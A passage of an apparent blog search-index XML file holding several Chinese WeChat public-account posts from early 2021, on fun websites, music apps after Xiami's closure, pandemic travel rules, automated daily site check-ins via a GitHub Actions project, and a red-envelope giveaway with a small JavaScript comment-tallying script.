b站 获取）。app 上看的效果和网页差不多，而且没有广告。 最后分享个b站视频下载器（公众号后台回复 b站 获取），支持4k、搜索、多p、多线程下载。 如果想下载大会员视频可以看看之前文章 如何下载 b 站大会员/腾讯/优酷/爱奇艺 VIP 视频 可以搜索视频，结果有播放数，弹幕数，评论数，收藏数等数据。点击解析可直接下载视频，当然也可以直接输入视频地址下载。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些好玩的生成器网站（三）]]></title>
    <url>%2F2021%2F01%2F29%2F%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%8E%A9%E7%9A%84%E7%94%9F%E6%88%90%E5%99%A8%E7%BD%91%E7%AB%99%EF%BC%88%E4%B8%89%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第211篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过的生成器网站： 那些好玩的生成器网站 那些好玩的生成器网站（二） 这里继续整理些好玩的生成器网站。 生成用户头像根据输入的文字生成用户头像图片https://multiavatar.com/ ，比如输入苏生生成一个专属地址 https://multiavatar.com/苏生 生成小学口算题家里有小朋友的用得上 https://codeh.cn/old/utils/MathQuestionGen.html 生成 ASCII 艺术字符图上传图片或者输入文字即可生成 ASCII 艺术字符图 https://ascii-generator.site/ 五彩二维码生成器嫌二维码太单调，试试这个 https://www.unitag.io/fr/qrcode ，如果想生成动态二维码可以看我之前的文章 七夕又来了，给女朋友做个动态二维码生成效果图： 营销号生成器 一股浓浓的营销味https://kaseidis.gitee.io/interesting_gadgets/marketing_generator/index.htm ，跟狗屁不通文章生成器很配 https://suulnnka.github.io/BullshitGenerator/index.html GIF倒放生成器倒放经典的和珅打手图 https://lab.bangbang93.com/gif-reverse 生成的效果： 生成分享海报输入网址自动生成标题图片，便于在社交媒体分享 https://thumbnail.ai/ ，比如豆瓣电影《大话西游》 https://movie.douban.com/subject/1292213/ 艺术字体转换输入文字，选择对应字体生成 http://www.piaofangw.com/ 生成奥利奥点击下方的文字生成对应数量的奥利奥 https://ljl.li/oreooo/ 生成效果图： 微软 ai 对联生成微软亚洲研究院出品的 ai 对联 http://duilian.msra.cn/app/couplet.aspx 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[今年还能回家过年吗？查询下各地出行隔离政策]]></title>
    <url>%2F2021%2F01%2F29%2F%E4%BB%8A%E5%B9%B4%E8%BF%98%E8%83%BD%E5%9B%9E%E5%AE%B6%E8%BF%87%E5%B9%B4%E5%90%97%EF%BC%9F%E6%9F%A5%E8%AF%A2%E4%B8%8B%E5%90%84%E5%9C%B0%E5%87%BA%E8%A1%8C%E9%9A%94%E7%A6%BB%E6%94%BF%E7%AD%96%2F</url>
    <content type="text"><![CDATA[今天18号了，春节临近，往年这个时候就要开始抢票了 2020 春节买火车票攻略和抢票工具分享 由于疫情的缘故，很多地方都出台了政策，今年我可能不能回家过年了。 中高风险地区回江西需持7日内核酸检测阴性证明，还要居家做好14天的健康监测。https://mp.weixin.qq.com/s/LxfKY0nzeAs0YEkoIGrURw 通过腾讯的小程序腾讯出行服务 可以查询疫情风险等级。 昌平属于低风险。目前高风险地址有河北和黑龙江部分地区。 北京有部分中风险地区。最新疫情通报可在这里查询http://www.nhc.gov.cn/xcs/yqtb/list_gzbd.shtml卫健委提示非必要不出京 。还有微博话题 #29个省区市倡议就地过年# 倡议大家在当地过年https://weibo.com/2375086267/JD2bshMnT 除了小程序也可以通过本地宝网页查询 http://m.bj.bendibao.com/news/gelizhengce/all.php 还有新浪新闻的各地返乡隔离政策http://news.sina.cn/project/fy2020/covid_19_trip.d.html，当然最准确的还是直接打电话（区号+12345）问当地卫健部门 。 马上过年了，最后推荐几个网站，如果准备买房，相亲结婚，有人找你借钱什么的用得上 。 查征信记录https://ipcrs.pbccrc.org.cn/ 万一对方背了网贷什么的，别被坑了。 中国裁判文书https://wenshu.court.gov.cn/ 全国法院失信被执行人名单http://zxgk.court.gov.cn/shixin/ 中国执行信息公开网http://zxgk.court.gov.cn/ 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用 Python 抓取我常看的几个公众号]]></title>
    <url>%2F2021%2F01%2F15%2F%E7%94%A8-Python-%E6%8A%93%E5%8F%96%E6%88%91%E5%B8%B8%E7%9C%8B%E7%9A%84%E5%87%A0%E4%B8%AA%E5%85%AC%E4%BC%97%E5%8F%B7%2F</url>
    <content type="text"><![CDATA[苏生不惑第211篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前整理过我的公众号文章列表 2020 年公众号 苏生不惑 200 多篇原创文章整理 ，于是顺便抓取下我常看的一些公众号，因为手机上找文章很麻烦，得一直往下拉，搜索又不太方便。 抓取过程见我之前的文章一键下载公众号所有文章，导出文件支持PDF，HTML，Markdown，Excel，chm等格式 ，这里目前只抓取了文章发布时间，文章标题和文章简介，而且由于公众号字数限制，发不了全部文章，在文章评论区说说你常看哪些公众号，如果你也想获取某个公众号的文章列表可以微信联系。 刘备我祖这个号很有意思，用文言文写文章，语言功底真强，目前发表了300多篇原创文言文文章，他的简介是这样的： 从五千年历史中挖掘提炼人生正能量，破解史上神秘符号，让史上所有帝王将相圣贤英雄成为您的无穷能源。 公众号《刘备我祖》文章列表 混知这个号的文章几乎都是图片科普，改过几次名字，简介是专治不明白！，很不错的科普公众号。 公众号《混知》文章列表 西二旗生活指北这个号也是图文为主，简介是中国互联网の首席人类观察员，如果你在互联网公司工作应该都看过这个号。 公众号《西二旗生活指北》文章列表 新闻酸菜馆这是我听了很多年的播客节目，它的简介是知名独立电台，聊新闻、寻开心！听新闻就上酸菜馆！ 公众号《新闻酸菜馆》文章列表 黄一刀有毒一个很无聊的漫画人，以漫画形式写文章，很有趣。 公众号《黄一刀有毒》文章列表 六神磊磊读金庸如果你是金庸迷，应该看过他的文章，生动有趣的写金庸里的人物。 公众号《六神磊磊读金庸》文章列表 大象放映室玩b站应该都看过她的视频，最近的《激荡四十年系列》系列很不错。 公众号《大象放映室》文章列表 新闻哥腾讯新闻“优秀员工”，轻幽默、爱吐槽、有正义感的新闻哥，希望你们喜欢我提供的内容。我每天下班路上都会看看。 公众号《新闻哥》文章列表 微信派最新微信频繁更新，如果想了解微信最新上线的功能，关注这个官方号就没错。公众号《微信派》文章列表 三表龙门阵以有趣抵御无趣，三表龙门阵致力于透过纷繁芜杂的公共热点，提供解渴、理性、独到的声音。也看过很多年了。公众号《三表龙门阵》文章列表 越女事务所带你感受金钱的善意。公众号《越女事务所》文章列表 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些有趣的网站系列（九）]]></title>
    <url>%2F2021%2F01%2F15%2F%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99%E7%B3%BB%E5%88%97%EF%BC%88%E4%B9%9D%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第210篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过有趣的网站有： 那些有趣的网站 那些有趣的网站（二） 那些有趣的网站系列（三） 那些有趣的网站系列（四） 那些有趣的网站系列（五） 那些有趣的网站系列（六） 那些有趣的网站系列（七） 那些有趣的网站系列（八） 这是系列第9篇。 一键生成英文logo神器只要输入你想生成的英文logo名称（比如susheng），自动帮你生成100多个logo模板，支持免费下载为png格式图片 http://emblemmatic.org/markmaker/#/designs 数学方程分步求解只要输入你想求解或者证明的数学方程式，自动帮你把答案计算出来，还提供求解过程，学生朋友的福音 https://zs.symbolab.com/ 故障效果生成器上传图片可以生成类似抖音的效果图 https://photomosh.com/ 生成效果： 历史车轮这是一个历史数据可视化工具的集合网站，为历史爱好者提供帮助 https://www.lishichelun.com/wheel ，比如动画展示 宋朝皇帝及在位时期 。 轻文档一个在线U盘，24小时免费储存，免登陆上传下载文件，传输文件更方便 http://qingwendang.com/ 动画台词搜索输入动画对白台词就可以找到对应的动漫 https://dialogue.moe ，比如《海贼王》里这句人的梦想啊，是永远不会结束的 ，如果想找电影台词看看我之前文章 如何根据台词找到对应电影片段 在线 ps安装ps软件太麻烦，直接用在线版吧 https://ss.js.org/ps ，https://www.photopea.com/ http://paint.net/ ，国内也有 https://ps.gaoding.com/ 小森平的免费下载音效一个日本大神做的免费音效网站，涵盖面很广（日常生活，动物，乐器，游戏动画，活动等），可用idm免费下载 https://taira-komori.jpn.org/freesoundcn.html 人工智能识别涂鸦识别你画的涂鸦是否正确，类似你话我猜 https://quickdraw.withgoogle.com/ 我画了2条线识别出是河流。 电影海报库这个网站可以查到1912年到现在最新电影的海报资料，支持按年代、片名、演员等搜索 http://www.impawards.com/ 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[虾米音乐关闭后还有什么好用的音乐软件？]]></title>
    <url>%2F2021%2F01%2F15%2F%E8%99%BE%E7%B1%B3%E9%9F%B3%E4%B9%90%E5%85%B3%E9%97%AD%E5%90%8E%E8%BF%98%E6%9C%89%E4%BB%80%E4%B9%88%E5%A5%BD%E7%94%A8%E7%9A%84%E9%9F%B3%E4%B9%90%E8%BD%AF%E4%BB%B6%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[苏生不惑第209 篇原创文章，将本公众号设为星标，第一时间看最新文章。 前几天虾米音乐发布公告2月5号将正式关闭，12年的音乐软件要下架了https://act.xiami.com/wow/z/xiami/xiami/1215 https://weibo.com/1718436033/JBK1roIQH随后网易云音乐发布微博称支持一键迁移 https://weibo.com/1721030997/JBRnWwDU2 简单来说登录虾米APP复制自己的虾米id，打开网易云音乐迁移页面 https://mp.music.163.com/5ff41bc4cf6f270c8cfd8de9/index/index.html?showOpenBrowser=false 一键迁移，我测试了下迁移成功。 随后QQ音乐也发布微博支持迁移 https://y.qq.com/jzt/hdzxrenwu/b28d1d.htmlhttps://weibo.com/2169129705/JBTQSjUgA也迁移成功了,如果你还想下载虾米歌曲可以试试这个Python脚本 https://github.com/reorx/xiami_exporter 。 如果想迁移YouTube 到spotify 可以试试这个网站 https://www.tunemymusic.com/ 没有了虾米音乐还有什么好用的音乐软件呢？下面推荐几个（除了网易云音乐和QQ音乐）。 如果你依然喜欢用网易云音乐，又嫌版权少可以用之前分享的工具解锁一键解锁网易云音乐变灰歌曲 腾讯MOO 音乐腾讯旗下除了酷我、酷狗和QQ音乐三大音乐软件还有个MOO 音乐 https://moo.qq.com/ ，曲库很全，有安卓和ios版 ，如果你想简单地听听音乐可以试试，另外每天听歌满1个小时免费送VIP。 咪咕音乐很多人为了听周杰伦买了QQ音乐的会员，其实咪咕音乐上可以免费听杰伦的歌曲， 网页版就可以在线听，直接用idm就能下载mp3音频文件。除了网页版它也有APP https://music.migu.cn/v3/app 。 在线网站https://lvyueyang.github.io/web-music/app/ 这个网站也支持在线听杰伦歌曲。 还有九酷音乐 https://www.9ku.com/ ，看歌曲来源应该是酷狗，可以用idm直接下载下来，就是这个网站广告有点多，可以安装个广告终结者Chrome扩展搞定 如何去除烦人的垃圾广告无损音乐下载网站51ape http://www.51ape.com/ Chrome扩展之前分享过Listen 1 音乐播放器 https://listen1.github.io/listen1/ ，可以搜索和播放来自网易云音乐，虾米，QQ音乐，酷狗音乐，酷我音乐，Bilibili，咪咕音乐网站的歌曲。 还有音乐识别下载器 https://chrome.google.com/webstore/detail/%E9%9F%B3%E4%B9%90%E8%AF%86%E5%88%AB%E4%B8%8B%E8%BD%BD%E5%99%A8/elnlodchelennijomigiblbjekdihhgo?hl=zh-CN ，它有识别模式和检索模式，支持在线解析各大音乐网站如网易云音乐、唱吧、全民k歌、QQ音乐、酷狗、酷我的音乐、咪咕音乐,喜马拉雅音乐，无需下载客户端一键下载。 比如网易云音乐这首《小幸运》https://music.163.com/#/song?id=33206214 搜索也可以直接下载。 遗憾迟香音乐助手这个软件（公众号后台回复 音乐 获取软件）汇聚了全网音乐，支持搜索，在线听歌和下载。 https://yhcx.lanzoux.com/b0a3g7csh密码:421t下载的是mp3格式文件。 洛雪音乐助手这是个开源软件（支持Windows和Mac系统 ） https://github.com/lyswhut/lx-music-desktop ，汇集很多音乐平台资源，支持搜索，在线听歌和下载。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 最近原创文章： 如何下载 b 站大会员/腾讯/优酷/爱奇艺 VIP 视频 2020 豆瓣电影榜单出炉，直接在豆瓣上看电影吧 谷歌浏览器那些有趣的隐藏功能 不用写代码，Chrome 扩展神器 web scraper 抓取知乎热榜/话题/回答/专栏，豆瓣电影 不为人知的几个微信实用技巧 2020 年公众号 苏生不惑 200 多篇原创文章整理 签到太麻烦？全自动一键签到网易云音乐，b站，京东，百度贴吧等网站 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020 年公众号 苏生不惑 200 多篇原创文章整理]]></title>
    <url>%2F2021%2F01%2F08%2F2020-%E5%B9%B4%E5%85%AC%E4%BC%97%E5%8F%B7-%E8%8B%8F%E7%94%9F%E4%B8%8D%E6%83%91-200-%E5%A4%9A%E7%AF%87%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[时间过得真快，又一年过去了 ，去年整理过2019 年公众号 苏生不惑 近百篇原创文章整理，今年继续整理2020年的原创文章。 本公众号每周更新2-3篇原创文章，一般是早上8点20发，没有标题党，但愿没有浪费你时间，还能对你有帮助。 先来看看新榜统计的数据 https://cu2020.newrank.cn/新榜公众号2020年度回顾 这一年发布了198篇文章，122篇原创。写过的总字数50万，阅读时长1056分钟，相当于看了2季《生活大爆炸》。 下面就分类整理下过去一年发过的文章（链接可点击），建议收藏。 实用技巧那些有意思的谷歌/百度搜索彩蛋 那些有意思的网站彩蛋 如何优雅的对网页截取长图 那些你可能不知道的网络冷知识奇技淫巧 如何搞定某些网站不让复制文字 网址太长了难看？生成个短网址吧 如何更优雅地看电影/刷剧 那些你可能不知道的 windows 奇技淫巧 如何让你的搜索更高效 如何根据台词找到对应电影片段 微信你刚才微信上撤回了什么？我都看到了 微信支付分开通了，来看看你有多少分 c 盘空间又满了？微信清理神器帮你释放空间 如何导出你的微信语音 一键生成你的微信社交数据报告 如何发一条九宫格图片的朋友圈 集赞生成器：朋友圈集赞不求人 2020微信运动一键刷步数，让你重回排行榜第一 不为人知的几个微信实用技巧 音乐话说虾米音乐2月5号正式关闭了，有账号的去备份下数据吧https://act.xiami.com/wow/z/xiami/xiami/1215 https://weibo.com/1718436033/JBK1roIQH 网易云音乐等级快速升级：每天自动打卡听歌300首 一键解锁网易云音乐变灰歌曲 不想下载那么多音乐软件？全网音乐在线听和下载 歌单助手：一键导出网易云音乐歌单列表，推荐你喜爱的专辑 一键备份导出虾米音乐数据，包含收藏专辑/音乐/艺人/歌单 Python公众号后台回复 Python 送你一份学习资料（电子书+视频），学起来不难，关键在坚持。 七夕又来了，给女朋友做个动态二维码 一键下载公众号所有文章，导出文件支持PDF，HTML，Markdown，Excel，chm等格式 一键批量下载抖音无水印视频 如何批量下载知乎回答图片 王菲k歌又上微博热搜，Python分析下微博网友评论 Python 抓取知乎电影话题下万千网友推荐的电影，这个国庆节不愁没电影看了 Chrome扩展话说没有安装扩展的浏览器是没有灵魂的，试试我推荐过的实用扩展。 那些实用的 Chrome 扩展神器（三） 分析你的浏览器历史记录，看看你喜欢访问哪些网站 上不了谷歌如何安装 Chrome 扩展？ 请停用以开发者模式运行的扩展程序？搞定谷歌浏览器插件弹窗 谷歌浏览器安装的 Chrome 扩展越来越多，怎么管理？ 那些有趣/实用的 Chrome 扩展神器 不会 Python 没关系，手把手教你用 web scraper 抓取豆瓣电影 top 250 和 b 站排行榜 那些有趣/实用的 Chrome 扩展神器系列（二） 2020 豆瓣电影榜单出炉，直接在豆瓣上看电影吧 浏览器你用谷歌还是edge浏览器？ 微软全新浏览器 Microsoft Edge 比 谷歌 Chrome 好用吗？ 那些你可能不知道的谷歌浏览器实用技巧 微软 edge 浏览器如何安装扩展 工具软件如何将视频轻松转换为 GIF 如何轻松的将文字转语音 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 那些好用的 GIF 录制工具 那些好用的翻译工具 如何快速搜索文件和文件内容 如何去除烦人的垃圾广告 2020 双 11 京东全民营业一键自动做任务 良心整理：PDF工具合集 一键下载中国大学/网易云课堂/慕课网等课程视频和课件 视频下载神器：支持腾讯/优酷/爱奇艺/b站/微博等全网视频 一键下载百度文库/豆丁/道客巴巴文档，支持导出PDF，Word，txt 文件 油猴脚本油猴脚本不愧为神器。 搜不到你想看的书/音乐/电影？一个油猴脚本帮你搞定 实用油猴脚本推荐，让你的谷歌浏览器更强大 解除网页查看限制，自由查看和跳转网站 b 站你的b站账号多少级了？ b 站账号快速升级到 Lv6：每天自动签到，观看，分享，投币视频 bilibili(b站)升级到BV号了，还想用av号怎么办？ 如何更优雅地使用 bilibili(b站) 想方便快捷的分享/收藏图片？试试免费好用的微博/b站图床 如何找回bilibili(b站)收藏夹里失效的视频？ 如何免登陆观看b站大会员番剧 借用 potplayer 播放器，在本地播放 b 站视频也能看弹幕了 下载b站外挂字幕,用 potplayer 播放视频也能看字幕了 网站推荐这些有趣的网站能玩一天。 那些有意思的网站（二） 那些好玩的生成器网站（二） 那些你可能用得上的在线办公神器 那些你可能用得上的在线办公神器（二） 那些好玩的网站 那些好玩的网站（二） 那些好用的无版权免费图片网站 听说 520 你还没对象，来这里看看 那些有趣的网站（二） 那些有趣的网站系列（三） 那些你可能用得上的在线办公神器系列（三） 那些经典好玩的在线游戏：魂斗罗，超级马里奥，坦克大战 不会 ps 没关系，在线一键抠图 这个网站堪称宝藏，收藏起来吧 那些有趣的网站系列（四） 神器！人工智能分离歌曲中的人声和背景音乐 那些有趣的网站系列（五） 2020 最全电子书搜索网站，找电子书不再愁 宝藏网站系列：这个网站号称万能 宝藏网站系列：浏览器书签共享平台 那些有趣的网站系列（六） 那些有趣的网站系列（七） 那些有趣的网站系列（八） 公众号如果你有想下载/备份的公众号可以微信联系我。 一键下载公众号所有文章，导出文件支持PDF，HTML，Markdown，Excel，chm等格式 再谈备份网页和公众号文章 如何备份可能被删的公众号文章和网页 一个骚操作，公众号粉丝破10万！ 关于公众号搜索和专辑 关于 苏生不惑 公众号 微博如果你有想下载/备份的微博可以微信联系我。 一键备份微博并导出生成PDF，顺便用Python分析微博账号数据 如何更优雅地使用微博 再谈备份微博 百度网盘百度网盘真是一言难尽。 2020 年 3 月最新加速下载百度网盘文件方法 2020 年 4 月使用 Aria2 加速下载百度网盘文件 2020 最全百度网盘搜索，找电影资源不再愁 2020年7月最新加速下载百度网盘文件方法 2020年8月最新免费加速下载百度网盘文件方法 2020年10月最新免费加速下载百度网盘文件方法 百度网盘下载太慢？不限速的阿里云盘来了 百度网盘分享链接秒挂？试试这个神器 在线加速播放百度网盘视频（其实支持任意网站） 疫情快速了解新型肺炎疫情最新动态 10 秒钟给你的微信头像添加口罩 关注腾讯较真和微博辟谣，拒绝新型肺炎谣言 春节假期在家无聊？来这里看看 用知识抗击疫情，机械工业/电子工业/清华大学等出版社免费开放电子书阅读 来看看你所在小区附近是否有新型肺炎疫情 你还没买到口罩吗？ 2020 年 4 月 4 日,互联网集体变灰 疫情下的新浪工作日常 现金红包福利去年发了几千块红包，争取今年能发出1万给大家。 发福利了，小伙伴们来领现金红包 中秋/国庆节发福利了，小伙伴们来领现金红包 2020 新年福利，直接现金红包抽奖 2020年10月福利，小伙伴们来领现金红包 2020 年 11 月福利，小伙伴们来领现金红包 2021 年元旦福利，小伙伴们来领现金红包 付费文章3篇一块钱的付费文章，有100多人付费了，感谢各位支持。 如何通过电影截图找到电影 不用写代码，Chrome 扩展神器 web scraper 抓取知乎热榜/话题/回答/专栏，豆瓣电影 如何下载 b 站大会员/腾讯/优酷/爱奇艺 VIP 视频 其他2019 年我在知识星球上都发了些什么 2019 各大 APP 年度报告整理 身份证号码的秘密 –..—.–..-.-/-..–…-….–./——.-.-…-./-.-..–…..-.- 如何有效的维权，这些投诉平台你可能用得上 手把手教你申报2019个人所得税（已退税1800） 为什么别人不回你的微信？说说如何正确的提问 最后说说2021年你有什么小目标（脱单还是暴富）？可以在文末评论，明年这个时候再来看看。 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[签到太麻烦？全自动一键签到网易云音乐，b站，京东，百度贴吧等网站]]></title>
    <url>%2F2021%2F01%2F08%2F%E7%AD%BE%E5%88%B0%E5%A4%AA%E9%BA%BB%E7%83%A6%EF%BC%9F%E5%85%A8%E8%87%AA%E5%8A%A8%E4%B8%80%E9%94%AE%E7%AD%BE%E5%88%B0%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%EF%BC%8Cb%E7%AB%99%EF%BC%8C%E4%BA%AC%E4%B8%9C%EF%BC%8C%E7%99%BE%E5%BA%A6%E8%B4%B4%E5%90%A7%E7%AD%89%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[苏生不惑第208 篇原创文章，将本公众号设为星标，第一时间看最新文章。 很多网站/app每天签到会有奖励，说说你持续签到时间最久的是哪个网站/app，持续了多少天？每天坚持签到得靠毅力，如果不想中断签到可以试试今天分享的神器。 签到小助手公众号后台回复 签到 下载软件 ，它支持京东，b站，腾讯视频，爱奇艺，QQ音乐，网易云音乐等网站，其中京东还支持 领京豆，领券，领红包京东超市，京东农场什么的。 点击登录你要签到的网站，这里以网易云音乐为例。登录成功后配置中选择网易云音乐，再点击执行，签到成功。 再次打开网易云音乐网站，可以看到状态是已经签到。 其他网站类似操作，配置好要签到的网站后打开软件执行即可一次性签到完所有网站，如果想要它每天自动签到推荐下面这个工具 一键签到。 一键签到公众号后台回复 签到 下载软件 ，它支持b站，网易云音乐，京东，什么值得买等网站，右键选择要签到的网站登录账号，这里还是以网易云音乐为例。登录可以使用账号密码，不过推荐使用cookie 。 如果需要签到的时候微信通知你可以配置server酱，还可以选择每天定时执行签到时间。点击调试签到成功，微信也收到通知了。 最后说下使用 GitHub 每天自动签到百度贴吧，这个操作和之前文章 b 站账号快速升级到 Lv6：每天自动签到，观看，分享，投币视频 b站签到差不多。 百度贴吧每天自动签到首先fork https://github.com/srcrs/TiebaSignIn 这个项目，这个项目可以每天自动签到你关注的贴吧，这里以签到周杰伦吧为例 https://tieba.baidu.com/f?ie=utf-8&amp;kw=%E5%91%A8%E6%9D%B0%E4%BC%A6&amp;fr=search打开贴吧控制台获取cookie里的 bduss 打开你的GitHub项目setting ，增加个bduss的secrets ，如果想收到微信通知可以再加个 SCKEY 。添加secrets后开启actions，它默认是关闭的。 再修改文件run.txt 的flag为1，它会自动触发签到任务。也可以增加wiki来启动任务 。 查看下执行日志。 成功签到4个贴吧微信也收到通知了。 周杰伦百度贴吧页面也是签到状态。之后会每天早上6点微信通知你（可自己修改定时时间 https://github.com/srcrs/TiebaSignIn/blob/master/.github/workflows/tieba.yml）。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 最近原创文章： 如何下载 b 站大会员/腾讯/优酷/爱奇艺 VIP 视频 一键下载百度文库/豆丁/道客巴巴文档，支持导出PDF，Word，txt 文件 解除网页查看限制，自由查看和跳转网站 不用写代码，Chrome 扩展神器 web scraper 抓取知乎热榜/话题/回答/专栏，豆瓣电影 不为人知的几个微信实用技巧 谷歌浏览器那些有趣的隐藏功能 2020 豆瓣电影榜单出炉，直接在豆瓣上看电影吧 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2021 年元旦福利，小伙伴们来领现金红包]]></title>
    <url>%2F2021%2F01%2F08%2F2021-%E5%B9%B4%E5%85%83%E6%97%A6%E7%A6%8F%E5%88%A9%EF%BC%8C%E5%B0%8F%E4%BC%99%E4%BC%B4%E4%BB%AC%E6%9D%A5%E9%A2%86%E7%8E%B0%E9%87%91%E7%BA%A2%E5%8C%85%2F</url>
    <content type="text"><![CDATA[12月过去了，2020年也就过去了，又到了发福利的时候了，之前发过的红包福利见文章： 2020 年 11 月福利，小伙伴们来领现金红包 2020年10月福利，小伙伴们来领现金红包 中秋/国庆节发福利了，小伙伴们来领现金红包 8月发福利了，小伙伴们来领现金红包 首先是12月份在公众号文章末尾评论天数前30的小伙伴（说明下评论仅限文章发布当天）。 12个50块,10个18块,8个8块共844块（加我微信领取），请允许我过几天发个广告缓和下。 由于这次人比较多，所以单个金额没有那么大，还望理解下，毕竟经费有限，之后广告收入增加了，单个红包金额也会增加的。 这次统计用了点代码（有些人的微信昵称含有各种emoji表情和奇怪字符，如果统计出bug就抱歉了），但还是没有实现自动化，不过总算比上次快点，本来前几天统计过一次，结果发现有人改了微信昵称，于是今天又统计一次。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647function timetrans(date)&#123; var date = new Date(date*1000);//如果date为13位不需要乘1000 var Y = date.getFullYear() + '-'; var M = (date.getMonth()+1 &lt; 10 ? '0'+(date.getMonth()+1) : date.getMonth()+1) + '-'; var D = (date.getDate() &lt; 10 ? '0' + (date.getDate()) : date.getDate()) + ' '; var h = (date.getHours() &lt; 10 ? '0' + date.getHours() : date.getHours()) + ':'; var m = (date.getMinutes() &lt;10 ? '0' + date.getMinutes() : date.getMinutes()) + ':'; var s = (date.getSeconds() &lt;10 ? '0' + date.getSeconds() : date.getSeconds()); return Y+M+D;&#125;function unique (arr) &#123; return Array.from(new Set(arr))&#125; nick_names1 = [];comments.elected_comment.forEach(function(i)&#123; if (timetrans(i.create_time).trim() == '2020-11-19')&#123;//判断评论时间为文章发布当天 nick_names1.push(i.nick_name); &#125;&#125;)countTimes(unique(nick_names).concat(nick_names2,))function countTimes(data) &#123; var obj = &#123;&#125;; return data.reduce(function(time, name) &#123; if (name in time) &#123; time[name]++; &#125; else &#123; time[name] = 1; &#125; return time; &#125;, &#123;&#125;);&#125;;function sortObject(obj) &#123; var arr = []; for (var prop in obj) &#123; if (obj.hasOwnProperty(prop)) &#123; arr.push(&#123; 'name': prop, 'count': obj[prop] &#125;); &#125; &#125; arr.sort(function(a, b) &#123; return b.count- a.count; &#125;); //arr.sort(function(a, b) &#123; a.value.toLowerCase().localeCompare(b.value.toLowerCase()); &#125;); //use this to sort as strings return arr; &#125;sortObject(countTimes(unique(nick_names1).concat(unique(nick_names2),unique(nick_names3),unique(nick_names4),unique(nick_names5),unique(nick_names6),unique(nick_names7),unique(nick_names8),unique(nick_names9),unique(nick_names10),unique(nick_names11),unique(nick_names12)))) 另外12月份发的红包记录如图2020 年 11 月福利，小伙伴们来领现金红包 除了上面30位小伙伴获得的共800多元微信红包，另外发个抽奖，公众号后台回复 中奖 进入小程序抽奖，抽1人88块（当请吃午饭了），1月3号20点开奖（会有微信通知开奖），中奖后可直接提现到微信钱包。 除了获得红包，我觉得更重要的是大家觉得我写的文章对你有用。由于公众号后台超过48小时的留言我是回复不了的，所以如果有问题可以在文章末尾评论或者加我微信交流，知道的一定帮你解答。 目前公众号已发布207篇原创文章（哇，我都写了这么多了）。 大家有兴趣可以在公众号菜单栏中点击历史文章进入文章列表查看。 12月的的付费文章如何下载 b 站大会员/腾讯/优酷/爱奇艺 VIP 视频 评价还不错，目前已有71人付费支持，感谢。 公众号每周更新2-3篇原创文章，一般是早上8点20发，没有标题党，但愿没有浪费你时间，还能对你有帮助。 话说每周写2-3篇原创文章还是挺有压力的，毕竟平时还要上班，经常要写到凌晨1点，有人问为什么不像其他公众号一样转发别人文章，而且还可以增加收入（文章有广告收益），因为我就是想要不一样，这样才能你让关注我觉得有点价值。 最后说下，由于现在公众号信息流乱序了，已经不按时间倒序来展示你关注的公众号更新，如果不想错过我的文章，麻烦将本公众号设置为星标，这样就不用在你关注的那么多公众号里翻了 。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020 豆瓣电影榜单出炉，直接在豆瓣上看电影吧]]></title>
    <url>%2F2021%2F01%2F08%2F2020-%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%E6%A6%9C%E5%8D%95%E5%87%BA%E7%82%89%EF%BC%8C%E7%9B%B4%E6%8E%A5%E5%9C%A8%E8%B1%86%E7%93%A3%E4%B8%8A%E7%9C%8B%E7%94%B5%E5%BD%B1%E5%90%A7%2F</url>
